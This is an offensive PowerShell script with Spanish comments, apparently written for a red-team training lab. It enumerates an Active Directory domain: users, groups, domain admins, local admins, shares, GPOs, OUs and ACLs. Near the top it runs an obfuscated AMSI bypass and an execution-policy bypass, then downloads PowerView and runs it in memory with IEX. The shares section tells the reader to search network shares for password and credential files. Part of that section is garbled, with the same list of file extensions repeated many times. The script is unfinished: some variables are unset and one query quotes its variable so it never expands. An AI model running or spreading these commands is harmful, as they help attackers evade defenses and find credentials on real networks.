#     ▄▄▄   ▄▄     ▄▄▄▄  ▄▄▄▄  ▄▄   ▄▄██▄▄   ▄▄██▄   ███        ▄███▄   ▄▄▄▄▄▄
#     ██▌  ▐██     ███▌  ████  ██▌ ███▀▀██▌ ▐██▀▀███ ▐██   ██  ██▀▀███  ███▀▀██▌
#     ██▌  ▐██    ████▌  █████ ██▌ ██▌  ▀██ ███  ▐██  ██  ▐█▌  ▀▀  ▐██  ██▌  ██▌
#     ███▄▄███   ██ ██▌  ██▌██ ██▌ ██▌ ▄▄▄▄ ███  ▐██  ██▌ ██     ▄███▀  ███▄▄██
#     ███▀▀███  ██▀ ██▌  ██▌ ████▌ ██▌ ▀███ ███  ▐██  ▐██ ██     ▀▀███  ███▀███
#     ██▌  ▐██ ███▄▄███▄ ██▌ ▀███▌ ██▌  ███ ███  ▐██   ██▐██   ▄▄  ▐██  ██▌  ██▌
#     ██▌  ▐██ ▀▀▀▀▀███▀ ██▌  ███▌ ███  ███ ▐██  ███   ████   ▐██  ███  ██▌  ██▌
#     ██▌  ▐██      ██▌  ██▌  ▐██   ▀████▀   ▀████▀    ▀███    ▀████▀   ██▌  ███ 
#                                                                 ThePWNDpr0j3ct






#En primer lugar importamos todas las herramientas necesarias para la enumeración
# La idea es integrar PowerView_Dev y el módulo de powershell de Active Directory de Microsoft cargando la DLL para evitar la instalación

#ejecutamos un intento de bypass de AMSI y de la política de ejecución de scripts de PowerShell
$PS_ep_bypass = powerhsell -ep bypass
$amsi_bypass = S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x')) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U')+'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )

$PS_ep_bypass
$amsi_bypass


$PS_AD_DLL = Import-Module .\Microsoft.ActiveDirectory.Management.dll
$AD_module = Import-Module .\ActiveDirectory\ActiveDirectory.psd1

$PowerView = IEX([Net.Webclient]::new().DownloadString("https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"))



#ABOUT ME
# en primer lugar enumeramos información sobre el usuario que tenemos en la sesión
$my_username = whoami
#como whoami devuelve un formato dominio\usuario , con select string hay que indicar que guarde en la variable $my_username solo la parte a la derecha del \
$my_username = $my_username | select-string -pattern "\\(.*)" -AllMatches | %{$_.Matches.Value} | %{$_.substring(1)}

whoami /priv

Get-ADUser  -Identity $my_username -properties *

$my_groups = Get-ADPrincipalGroupMembership -Identity $my_username
#como Get-ADPrincipalGroupMembership devuelve un formato en distintas lineas, queremos seleccionar solo los valores de name y guardarlos en una lista en la variable $my_groups_list para posteriormente cruzar la lista de grupos a los que pertenezco con la lista de grupos en los que hay administradores del domínio o administradores locales



#MY COMPUTER
# en segundo lugar enumeramos información sobre la maquina en la que nos encontramos
$my_hostname = hostname
Get-ADComputer -Identity @my_hostname -properties *

#Enumerar todos los grupos locales de la maquina (Requiere privilegios de administrador en la maquina)
Get-NetLocalGroup -ComputerName "$hostname.dollarcorp.moneycorp.local" -ListGroups

#Enumerar todos los miembros de los grupos locales de la maquina  (Requiere privilegios de administrador en la maquina)
Get-NetLocalGroup -ComputerName "$hostname.dollarcorp.moneycorp.local" -Recurse


#DOMAIN
# En tercer lugar comenzamos a enumerar información sobre el dominio en el que nos encontramos
$domain = (Get-WmiObject -Class Win32_ComputerSystem).Domain

$ADPS_domain = Get-ADDomain -Identity $domain -properties *

$domain_SID = (Get-ADDomain).DomainSID

$DCs = Get-ADDomainController


#GROUPS

$all_groups = Get-ADGroup -Filter * | select Name

# variable para identificar el grupo de administradores del dominio
#tengo que pensar como con IA poder identificar el grupo de administradores del dominio , pasar un listado de commonn names de grupos DA y hacer match.
#$DA_Group = 

$DA_Members = Get-ADGroupMember -Identity "$DA_Group" -Recursive

#ADMINS
$admins = Get-ADUser -Filter 'Name -like "*admin*"' -Properties * | select name
$desc_admin = Get-ADUser -Filter 'Description -like "*admin*"' -Properties Description | select name,Description
#aquí habría que matchear las dos las dos listas de usuarios y quitar duplicados 
#se indicaría cuales son admin en el campo de username y cuales son admin por su descripcióm

#Buscar Domain Admins (DA)
Get-ADGroupMember -Identity "Domain Admins" -Recursive

#Buscar Local Admins en las maquinas del dominio
#Requiere PowerView
#Invoke-EnumerateLocalAdmin

#MAQUINAS EN EL DOMINIO
#Requiere PowerView
#Get-NetComputer


#SMB Shares
#Enumeramos los recursos compartidos de la red
#que buscar dentro de los shares >  .kdbx .kdb .ps1 .bat .exe .dll .vbs .vbe .js .jse .wsf .wsh .ps1xml .ps2xml .psc1 .psc2 .msh .msh1 .msh2 .mshxml .msh1xml .msh2xml .scf .lnk .inf .reg .doc .docx .xls .xlsx .ppt .pptx .pdf .rtf .csv .xml .zip .rar .7z .tar .gz .bak .tmp .log .ini .cfg .config .sql .db .mdb .accdb .pptm .xlsm .docm .dotm .ppsm .ppsx .potm .potx .ppam .sldm .sldx .one .onetoc2 .thmx .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .vss .vst .vsdx .vssx .vstx .vsdm .vssm .vstm .mpp .mpt .mpd .mpp .pub .vsd .
#también podemos buscar archivos como >  password contraseña pass credenciales credencial usuario user admin administrador privilegiado priv , y archivos .txt
#PowerView
Invoke-ShareFinder
Invoke-FileFinder
Get-NetFileServer


#GPO
#Enumeramos las GPOs del dominio
Get-GPO -All


#OU
#Enumeramos las OU del dominio
$OU = Get-ADOrganizationalUnit -Filter * -Properties *


#ACL
#Enumeramos las ACLs del dominio
# EJEMPLO DE COMANDO >>>>>>>  (Get-ACL 'AD:\CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
(Get-ACL '$distinguishedName').Access



#TRUSTS
#enumeramos las relaciones de confianza del dominio